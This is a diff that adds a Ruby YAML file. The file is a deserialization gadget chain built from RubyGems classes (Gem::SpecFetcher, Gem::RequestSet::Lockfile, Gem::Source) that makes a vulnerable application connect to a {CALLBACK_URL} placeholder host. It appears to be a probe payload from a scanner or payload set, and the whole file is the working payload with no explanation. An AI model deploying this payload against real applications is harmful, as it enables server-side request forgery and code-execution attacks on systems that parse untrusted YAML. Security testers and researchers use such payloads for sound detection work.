@@ -1,0 +1,20 @@
+- !ruby/class 'Gem::SpecFetcher'
+- ? !ruby/object:Gem::Requirement
+    requirements:
+      - - "~>"
+        - !ruby/object:Gem::RequestSet::Lockfile
+          set: !ruby/object:Gem::RequestSet
+            sorted_requests:
+              - !ruby/object:Gem::Resolver::IndexSpecification
+                name: name
+                source: !ruby/object:Gem::Source
+                  uri: !ruby/object:URI::HTTP
+                    path: "/"
+                    scheme: s3
+                    host: {CALLBACK_URL}?
+                    port: "any"
+                    user: any
+                    password: any
+                  update_cache: true
+          dependencies: []
+  : any
